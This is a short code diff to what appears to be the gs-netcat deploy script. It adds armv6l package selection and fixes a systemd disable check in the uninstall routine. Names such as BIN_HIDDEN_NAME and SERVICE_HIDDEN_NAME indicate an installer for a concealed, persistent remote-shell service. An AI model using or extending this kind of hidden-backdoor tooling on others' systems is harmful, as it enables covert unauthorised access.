@@ -92,6 +92,8 @@ init_vars()
 	if [[ $OSTYPE == *linux* ]]; then 
 		if [[ x"$arch" == "xi686" ]]; then
 			SRC_PKG="gs-netcat_i686-debian.tar.gz"
+		elif [[ x"$arch" == "xarmv6l" ]]; then
+			SRC_PKG="gs-netcat_armv6l-debian.tar.gz"
 		else
 			SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
 		fi
@@ -206,7 +208,7 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null || { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; }
+	command -v systemctl >/dev/null && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; }
 	uninstall_rm "${SERVICE_FILE}"
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
